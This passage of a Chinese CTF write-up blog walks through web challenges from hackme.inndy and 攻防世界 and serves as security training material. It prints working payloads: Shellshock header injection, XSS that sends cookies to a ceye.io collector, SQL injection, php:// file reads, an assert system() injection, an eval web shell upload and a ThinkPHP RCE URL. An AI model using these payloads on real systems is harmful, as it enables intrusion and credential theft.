<p><span lang=EN-US>wget –header=&quot;X-Exploit: () { : ; }; /?lag-reader /?lag &gt; /kt &lt; /kt &quot; -q -O - &quot;<a href="https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env" target="_blank" rel="noopener">https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env</a>&quot;</span></p>
<p>发现没反应，看了看文件发现没有权限，但是<span lang=EN-US>tmp</span>可以<span lang=EN-US>w</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image104.jpg" class=""></span></p>
<p>那我们在<span lang=EN-US>/var/tmp</span>下进行操作</p>
<p><span lang=EN-US>wget –header=&quot;X-Exploit: () { : ; }; /?lag-reader /?lag &gt; /var/tmp/kt &lt; /var/tmp/kt &quot; -q -O - &quot;<a href="https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=" target="_blank" rel="noopener">https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=</a><br>env&quot;</span></p>
<p>再读一下</p>
<p><span lang=EN-US>wget –header=&quot;X-Exploit: () { : ; };/bin/cat /var/tmp/kt&quot; -q -O - &quot;<a href="https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env" target="_blank" rel="noopener"><span style='color:windowtext;text-decoration:none'>https://command-executor.hackme.inndy.tw/index.ph<br>p?func=cmd&amp;cmd=env</span></a></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image105.jpg" class=""></span></p>
<p>即可获得<span lang=EN-US>flag</span>。</p>
<h2 id="XSSME"><a href="#XSSME" class="headerlink" title="XSSME"></a><a name="_Toc28387044"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>XSSME</span></a></h2><p>我怀疑服务器炸了，打<span lang=EN-US>cookie</span>打了半天总是显示<span lang=EN-US>undefined</span>，我怀疑真的是服务器的问题。</p>
<p>不管了，思路大致如下：</p>
<p>首先测试<span lang=EN-US>waf</span>，发现有较为细致的过滤，像是<span lang=EN-US>script</span>、）、<span lang=EN-US>&lt;img &gt;</span>之类的过滤，但是带空格，因此我们可以不输入空格来绕过部分过滤，<span lang=EN-US>&lt;svg/onload &gt;</span>或者不加空格的<span lang=EN-US>&lt;img sc””onerror=””&gt;</span>也可以绕过，那么我们尝试根据题目去构造<span lang=EN-US>payload</span>打管理员的<span lang=EN-US>cookie</span>。发到<span lang=EN-US>ceye</span>尝试</p>
<p>例如：</p>
<p><span lang=EN-US style='font-family:"等线 Light"'>&lt;img src=&quot;&quot;onerror=&quot;document.location=’<a href="http://qa3vfv.ceye.io/?cookie=&#39;+document.cookie" target="_blank" rel="noopener">http://qa3vfv.ceye.io/?cookie=&#39;+document.cookie</a>&quot;</span><span lang=EN-US style='font-family:"等线 Light"'>&quot;&gt;</span></p>
<p>或者</p>
<p><span lang=EN-US style='font-size:10.5pt;font-family:等线'>&lt;svg/onload=&quot; document.location=’http:// qa3vfv.ceye.io/?cookie=’+document.cookie &quot;&gt;</span><span style='font-size:10.5pt;font-family:等线'>都可以，但是收到的数据是<span lang=EN-US>undefined</span>？</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image106.jpg" class=""></span></p>
<p>但是我打自己的<span lang=EN-US>cookie</span>又有回显</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image107.jpg" class=""></span></p>
<p>奇了怪了。<span lang=EN-US>Orz</span></p>
<h1 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a><a name="_Toc28387045"><span style='font-size:18.0pt;font-family:黑体'>攻防世界</span></a></h1><h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a><a name="_Toc28387046"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>baby_web</span></a></h2><p><span lang=EN-US><img src="/2020/02/04/First/image108.jpg" class=""></span>打开题目看到<span lang=EN-US>1.php</span>，估计是让我猜数字吧，写个小脚本爆破发现爆破不出来。</p>
<p>测试<span lang=EN-US>index</span>发现还是回到了<span lang=EN-US>1.php</span>，可能有重定向，<span lang=EN-US>F12</span>请求<span lang=EN-US>index</span>看看，发现了</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image109.jpg" class=""></span></p>
<p>访问即可。</p>
<h2 id="CAT"><a href="#CAT" class="headerlink" title="CAT"></a><a name="_Toc28387047"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>CAT</span></a></h2><p>题目起了个<span lang=EN-US>cat</span>，估计是命令行读文件，同时发现是<span lang=EN-US>GET</span>传参，于是测试<span lang=EN-US>waf</span>，结果测到宽字节（<span lang=EN-US>%80</span>）的时候报错回显了一<br>大堆<span lang=EN-US>HTML</span>代码，发现<span lang=EN-US>python</span>路径，以及<span lang=EN-US>django</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image110.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image111.jpg" class=""></span></p>
<p>题目构成应该是有<span lang=EN-US>django</span>来处理<span lang=EN-US>PHP</span>请求。</p>
<p>我们可以用<span lang=EN-US>@+</span>绝对路径来查看文件。发现<span lang=EN-US>@</span>没被过滤，看看返回的信息，发现了数据库</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image112.jpg" class=""></span></p>
<p><span lang=EN-US>@ /opt/api/database.sqlite3</span>有回显找找宝贝</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image113.jpg" class=""></span></p>
<p>真难找。</p>
<h2 id="ics-04"><a href="#ics-04" class="headerlink" title="ics-04"></a><a name="_Toc28387048"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>ics-04</span></a></h2><p>有登录和注册界面，但是没什么用，还剩下一个密码找回。测测<span lang=EN-US>sql</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image114.jpg" class=""><img src="/2020/02/04/First/image115.jpg" class=""></span></p>
<p>字符注入，测测列数</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image116.jpg" class=""></span></p>
<p>之后就可以按照基本注入步骤进行注入了，回显在<span lang=EN-US>3</span>列</p>
<p><span lang=EN-US>1’ union select 1,2,group_concat(database()),4 #</span>页面有响应但是无回显，得换种方式，用<span lang=EN-US>group_concat()</span></p>
<p><span lang=EN-US>1’ union select 1,2,group_concat(schema_name),4 from information_schema.schemata #</span>页面回显</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image117.jpg" class=""></span></p>
<p>因此按照步骤下去，构造</p>
<p><span lang=EN-US>1’ union select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema=’cetc004’ #</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image118.jpg" class=""></span></p>
<p>分别探测<span lang=EN-US>username</span>与<span lang=EN-US>password</span></p>
<p><span lang=EN-US>1’ union select 1,2,group_concat(username,</span>‘‘<span lang=EN-US>password,question,answer),4 from cetc004.user#</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image119.jpg" class=""></span>额这样太乱了，变成这样</p>
<p><span lang=EN-US>1’ union select 1,2,group_concat(username,’,’,password),4 from cetc004.user#</span></p>
<p>得到口令和用户名，但是无法解密</p>
<p>试试直接新注册覆盖一个用户名，居然直接成功了，密码替换成了<span lang=EN-US>123</span></p>
<p>登陆试试</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image120.jpg" class=""></span></p>
<h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a><a name="_Toc28387049"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>ics-05</span></a></h2><p>打开题目，什么都没有，随便点了点发现了</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image121.jpg" class=""></span></p>
<p>看可能是文件包含，试试<span lang=EN-US>php</span>伪协议</p>
<p><span lang=EN-US>[<a href="http://111.198.29.45:52025/index.php?page=php://filter/convert.base64-encode/resource=index.php]" target="_blank" rel="noopener">http://111.198.29.45:52025/index.php?page=php://filter/convert.base64-encode/resource=index.php]</a>(<a href="http://111.198.29.45:52025/index.php?page=php://filter/convert.base64-encode/resource=i" target="_blank" rel="noopener">http://111.198.29.45:52025/index.php?page=php://filter/convert.base64-encode/resource=i</a><br>ndex.php)</span></p>
<p>成功读到文件</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image122.jpg" class=""></span></p>
<p>解密看到了一个重点关注的地方</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image123.jpg" class=""></span></p>
<p>我们需要将<span lang=EN-US>X-FORWARED-FOR</span>设置为<span lang=EN-US>localhost</span>，再以<span lang=EN-US>get</span>方式传递三个参数，这三个参数分别是<span lang=EN-US>preg_replace</span>的三个参数</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image124.jpg" class=""></span></p>
<p>那么我们可以如下构造命令</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image125.jpg" class=""></span></p>
<p>成功执行命令</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image126.jpg" class=""></span></p>
<p>改命令探测目录</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image127.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image128.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image129.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image130.jpg" class=""></span></p>
<p>最后</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image131.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image132.jpg" class=""></span></p>
<h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a><a name="_Toc28387050"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>ics-06</span></a></h2><p>题目描述的看起来好像有后门，但是看起来好像不是</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image133.jpg" class=""></span></p>
<p>送分？</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image134.jpg" class=""></span>看到这个我懂了</p>
<p>试着<span lang=EN-US>bp</span>爆破页面，还真的爆出来了，<span lang=EN-US>id=2333</span>去访问</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image135.jpg" class=""></span></p>
<h2 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a><a name="_Toc28387051"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>lottery</span></a></h2><p>之前貌似写过这题，记得是代码审计，不记得在哪了，算了不管了重新来。</p>
<p>但是服务器貌似炸了，佛了，之前的<span lang=EN-US>wp</span>补上。</p>
<p><span lang=EN-US>.git</span>源码泄露，但是这题直接给你了。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image136.jpg" class=""></span></p>
<p>大概是随机七个数全猜对就给你钱，但是没有对输入作比较，可以用<span lang=EN-US>php</span>弱类型绕过判断，因为<span lang=EN-US>true==1==</span>“<span lang=EN-US>1</span>”我记得要多跑几次，然后钱才够。</p>
<p>其中 <span lang=EN-US>$numbers </span>来自用户<span lang=EN-US>json</span>输入<span lang=EN-US>{&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:&quot;1234123&quot;},$win_numbers </span>是随机生成<br>的数字字符串。</p>
<p>用<span lang=EN-US>burp</span>抓个包，然后改下<span lang=EN-US>payload</span>为<span lang=EN-US>{&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]}</span></p>
<p>钱够了就可以<span lang=EN-US>getflag</span>了。</p>
<h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a><a name="_Toc28387052"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>NewsCenter</span></a></h2><p>一打开题目看到这个搜索框，忍不住测了测<span lang=EN-US>sql</span></p>
<p>还真有</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image137.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image138.jpg" class=""></span></p>
<p>测测列数</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image139.jpg" class=""></span></p>
<p><span lang=EN-US>1’ union select 1,2,group_concat(schema_name) from information_schema.schemata #</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image140.jpg" class=""></span></p>
<p><span lang=EN-US>1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’news’ #</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image141.jpg" class=""></span></p>
<p><span lang=EN-US>1’ union select<br>1,2,group_concat(column_name) from information_schema.columns where table_name=’secret_table’ #</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image142.jpg" class=""></span></p>
<p><span lang=EN-US>1’ union select 1,2,group_concat(fl4g) from secret_table #</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image143.jpg" class=""></span></p>
<h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a><a name="_Toc28387053"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>mfw</span></a></h2><p>打开看到这个</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image144.jpg" class=""></span>估计有泄露，试试</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image145.jpg" class=""></span></p>
<p>翻了翻好像没什么能用的，用<span lang=EN-US>Githack</span>找一下源码，看到了一个<span lang=EN-US>index.php</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image146.jpg" class=""></span></p>
<p>这个参数拼接很好利用，assert(“strpos(‘templates/“ . $page . “.php’, ‘..’) === false”) or die(“Detected hacking attempt!”);先闭合strpos，在注释掉后边的代码</p>
<p>如下构造：<span lang=EN-US>?page=kt’.’kt’) or system(‘cat templates/flag.php’);//</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image147.jpg" class=""></span></p>
<h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a><a name="_Toc28387054"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>Training-WWW-Robots</span></a></h2><p><span lang=EN-US>Robots</span>呗，还能有啥</p>
<p>探测<span lang=EN-US>robots.txt</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image148.jpg" class=""></span></p>
<p>访问一下</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image149.jpg" class=""></span></p>
<p>这也太水了吧<span lang=EN-US>……</span></p>
<h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a><a name="_Toc28387055"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>NaNNaNNaNNaN-Batman</span></a></h2><p>这题没有环境？</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image150.jpg" class=""></span></p>
<p>这乱码还能看得出丝毫的<span lang=EN-US>script</span>痕迹，<span lang=EN-US>eval</span>改成<span lang=EN-US>alert</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image151.jpg" class=""></span></p>
<p>打开我的<span lang=EN-US>phpstorm</span>，整理一下代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">"c"</span>).value;</span><br><span class="line">    <span class="keyword">if</span>(e.length==<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span>(e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)</span><br><span class="line">       <span class="keyword">if</span>(e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)</span><br><span class="line">           <span class="keyword">if</span>(e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)</span><br><span class="line">              <span class="keyword">if</span>(e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">                  <span class="keyword">var</span> t=[<span class="string">"fl"</span>,<span class="string">"s_a"</span>,<span class="string">"i"</span>,<span class="string">"e&#125;"</span>];</span><br><span class="line">                  <span class="keyword">var</span> n=[<span class="string">"a"</span>,<span class="string">"_h0l"</span>,<span class="string">"n"</span>];</span><br><span class="line">                  <span class="keyword">var</span> r=[<span class="string">"g&#123;"</span>,<span class="string">"e"</span>,<span class="string">"_0"</span>];</span><br><span class="line">                  <span class="keyword">var</span> i=[<span class="string">"it’"</span>,<span class="string">"_"</span>,<span class="string">"n"</span>];</span><br><span class="line">                  <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">                  <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)&#123;</span><br><span class="line">                     <span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">           &#125;</span><br><span class="line">    <span class="built_in">document</span>.write(‘&lt;input id=<span class="string">"c"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">button</span> ο<span class="attr">nclick</span>=<span class="string">$()</span>&gt;</span>Ok<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>’);</span><br><span class="line">    <span class="keyword">delete</span> </span><br></pre></td></tr></table></figure>
<p>这匹配看的头疼，想爆破来着，但不知道怎么下手，<span lang=EN-US>orz</span></p>
<p>后来想想干脆执行一下算了</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image152.jpg" class=""></span></p>
<p>放控制台执行一下，新<span lang=EN-US>firefox</span>执行换成了<span lang=EN-US>ctrl+enter</span>了，我按了半天都没反应<span lang=EN-US>2333</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image153.jpg" class=""></span></p>
<h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a><a name="_Toc28387056"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>bug</span></a></h2><p>看到题目总想测测注入，发现都没反应。</p>
<p>注册的时候发现<span lang=EN-US>admin</span>已经存在，无法覆盖，题目变成了获取<span lang=EN-US>admin</span>权限了</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a><a name="_Toc28387057"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>web2</span></a></h2><p>这题目起个<span lang=EN-US>web2</span>和<span lang=EN-US>web</span>关系并不大，按照密码顺序倒过来写就行了。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image154.jpg" class=""></span></p>
<p>写个<span lang=EN-US>php</span>脚本</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image155.jpg" class=""></span></p>
<h2 id="php2"><a href="#php2" class="headerlink" title="php2"></a><a name="_Toc28387058"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>php2</span></a></h2><p>这题有毒，一定要扫，扫到了一个<span lang=EN-US>phps…</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image156.jpg" class=""></span></p>
<p><span lang=EN-US>Id=urlencode</span>（<span lang=EN-US>id</span>）且<span lang=EN-US>id==admin</span>，且“<span lang=EN-US>admin</span>“！<span lang=EN-US>===id</span>，可以用二次<span lang=EN-US>url</span>编码，类似<span lang=EN-US>%253e==&lt;</span></p>
<p>那么尝试构造<span lang=EN-US>a=%2561</span>，<span lang=EN-US>id=%2561dmin</span></p>
<p>记得请求的时候在<span lang=EN-US>index.php</span>请求</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image157.jpg" class=""></span></p>
<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a><a name="_Toc28387059"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>unserialize3</span></a></h2><p>这题打开了就是一个简单的反序列化</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image158.jpg" class=""></span></p>
<p>照着写一个序列化</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image159.jpg" class=""></span></p>
<p>发送一下</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image160.jpg" class=""></span></p>
<p>将对象个数修改成大于实际对象个数的数值，出发反序列化漏洞</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image161.jpg" class=""></span></p>
<p>即可</p>
<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a><a name="_Toc28387060"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>upload1</span></a></h2><p>打开发现一个文件上传界面，<span lang=EN-US>F12</span>看到了<span lang=EN-US>js</span>脚本</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image162.jpg" class=""></span>是一个过滤</p>
<p>又看到有一个<span lang=EN-US>check</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image163.jpg" class=""></span></p>
<p>删掉直接上传文件</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image164.jpg" class=""></span></p>
<p>成功，找找<span lang=EN-US>flag</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image165.jpg" class=""></span></p>
<h2 id="web-php-include"><a href="#web-php-include" class="headerlink" title="web_php_include"></a><a name="_Toc28387061"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>web_php_include</span></a></h2><p>打开题目看到这个</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image166.jpg" class=""></span></p>
<p>发现对<span lang=EN-US>php</span>：<span lang=EN-US>//</span>进行了过滤，但是这个过滤不严谨，出现了常见的大小写的问题。</p>
<p><span lang=EN-US>Php://</span>可以绕过</p>
<p>尝试<span lang=EN-US>Php://filter/read=convert.base64-encode/resource=index.php;</span>读了个寂寞，得先探测目录，用<span lang=EN-US>input&nbsp; </span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image167.jpg" class=""></span></p>
<p>成功读取</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image168.jpg" class=""></span></p>
<p>这是可以直接该<span lang=EN-US>input</span>中的命令，也可以直接用<span lang=EN-US>filter</span>来读，我选择修改命令</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image169.jpg" class=""></span></p>
<p>成功</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image170.jpg" class=""></span></p>
<h2 id="ics-07"><a href="#ics-07" class="headerlink" title="ics-07"></a><a name="_Toc28387062"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>ics-07</span></a></h2><p><span lang=EN-US><img src="/2020/02/04/First/image171.jpg" class=""></span></p>
<p>有源代码，去瞅瞅</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image172.jpg" class=""></span>上面这是个上传，有过滤，而且上传成功之后是新建之后重新建立一个文件并写入。但最上面有一个问题，<span lang=EN-US>session</span>中的<span lang=EN-US>admi<br>n</span>要为<span lang=EN-US>true</span>，需要管理员权限</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image173.jpg" class=""></span></p>
<p>这里是获取管理员权限的页面，其他的都是正常<span lang=EN-US>sql</span>查询，最上面的<span lang=EN-US>if</span>大概是需要<span lang=EN-US>id</span>是数组而且<span lang=EN-US>id</span>经过<span lang=EN-US>floatval</span>的值不为<span lang=EN-US>1</span>，<span lang=EN-US>id</span>的最后一位数也要是<span lang=EN-US>9</span>，<span lang=EN-US>id</span>最后的查询值必须相当于<span lang=EN-US>1</span>才有获取<span lang=EN-US>admin</span>的可能。因为是<span lang=EN-US>floatval</span>处是弱类型比较，我们可以构造<span lang=EN-US>1</span>‘<span lang=EN-US> 9</span>来绕过</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image174.jpg" class=""></span></p>
<p>接下来是上传，需要绕过正则，<span lang=EN-US>filename</span>的<span lang=EN-US>.</span>后面的不区分大小写过滤了<span lang=EN-US>php34567</span>之类的，但是他只过滤了一个<span lang=EN-US>.</span>后面的<br>东西，并没有循环进行正则匹配，而且上传之后的真实目录为<span lang=EN-US>uploaded</span>，因此我们可以尝试构造</p>
<p><span lang=EN-US>?file=../kt.php/1.php/..&amp;con=&lt;?php @eval($_GET[‘a’]);?&gt;</span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image175.jpg" class=""></span></p>
<p><span lang=EN-US>POST</span>上传试试看，然后访问<span lang=EN-US>/uploaded/kt.php?a=1,</span>有反应</p>
<p>开始执行命令</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image176.jpg" class=""></span></p>
<p>直接上最后一步</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image177.jpg" class=""></span></p>
<h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a><a name="_Toc28387063"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>Web_php_unserialize</span></a></h2><p>打开题目看到这个</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image178.jpg" class=""></span></p>
<p>赤裸裸的反序列化，<span lang=EN-US>$var</span>是利用点，提示了<span lang=EN-US>fl4g.php</span>，正则过滤了<span lang=EN-US>O</span>：数字的形式，那我们可以构造<span lang=EN-US>o</span>：<span lang=EN-US>+</span>数字的形式绕过</p>
<p>如下：</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image179.jpg" class=""></span></p>
<p>拿出<span lang=EN-US>O:4:&quot;Demo&quot;:1:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}</span>修改一下变为<span lang=EN-US>O:+4:&quot;Demo&quot;:2:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}</span>还要<span lang=EN-US>base64</span>一下</p>
<p><span lang=EN-US>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span></p>
<p>提交试试<span lang=EN-US><img src="/2020/02/04/First/image180.jpg" class=""></span></p>
<h2 id="i-got-id-200"><a href="#i-got-id-200" class="headerlink" title="i-got-id-200"></a><a name="_Toc28387064"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>i-got-id-200</span></a></h2><p>打开界面，点击<span lang=EN-US>helloworld</span>发现了一个</span><span lang=EN-US><img src="/2020/02/04/First/image181.jpg" class=""></span><span>Perl</span><span>？好眼熟</span><span lang=EN-US><img src="/2020/02/04/First/image182.jpg" class=""></span><span>那么这个网站的构成文件都是<span lang=EN-US>pl</span>结尾，<span lang=EN-US>file</span>里有文件上传，看看<span lang=EN-US>perl</span>语言的漏洞里有个上传文件的<span ang=EN-US>param</span>（）<br>漏洞</span><span>param()</span><span>函数会返回 一个列表的文件 但是 只有第一个文件会被放入到下面的<span lang=EN-US>file</span>变量中。如果我们传入一个<span lang=EN-US>ARGV</span>的文件，那么<span lang=E
N-US>Perl</span>会将传入的参数作为文件名读出来。</span><span>我们可以抓个包，加入<span lang=EN-US>ARGV</span>，然后在<span lang=EN-US>URL</span>处传入命令</span><span lang=EN-US></span><span>可以读文件，我随便试了试<span lang=EN-US>flag</span>结果真的就出来了，<span lang=EN-US>2333</span></span><span lang=EN-US><img src="/2020/02/04/First/image184.jpg" class=""></span></span></p>
<h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php-rce"></a><a name="_Toc28387064"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>php-rce</span></a></h2><p>打开一看，哇又是这个<span lang=EN-US>thinkphp</span>，自带命令执行漏洞的轻量级框架</span><span lang=EN-US><img src="/2020/02/04/First/image185.jpg" class=""></span>找现成的<span lang=EN-US>payload</span>，百度一下</p>
<p>随手试一试<span lang=EN-US>[<a href="http://111.198.29.45:45426/index.php?s=index/thinkpp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find" target="_blank" rel="noopener">http://111.198.29.45:45426/index.php?s=index/thinkpp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find</a> / -name “flag”](<a href="http://111.198.29" target="_blank" rel="noopener">http://111.198.29</a>.<br>45:45426/index.php?s=index/thinkpp/invokefunction&amp;function=call_user_func_array&amp;vars%5b0%5d=system&amp;vars%5b1%5d%5b%5d=find%20/%20-name%20)</span><span lang=EN-US><img src="/2020/02/04/First/image186.jpg" class=""></span><span lang=EN-US>[<a href="http://111.198.29.45:45426/index.php?s=index/thinkpp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat" target="_blank" rel="noopener">http://111.198.29.45:45426/index.php?s=index/thinkpp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat</a> /flag](<a href="http://111.198.29.45:45426/index" target="_blank" rel="noopener">http://111.198.29.45:45426/index</a><br>.php?s=index/thinkpp/invokefunction&amp;function=call_user_func_array&amp;vars%5b0%5d=system&amp;vars%5b1%5d%5b%5d=cat)<span style='color:black'></span></span><span lang=EN-US><img src="/2020/02/04/First/image187.jpg" class=""></span></p>
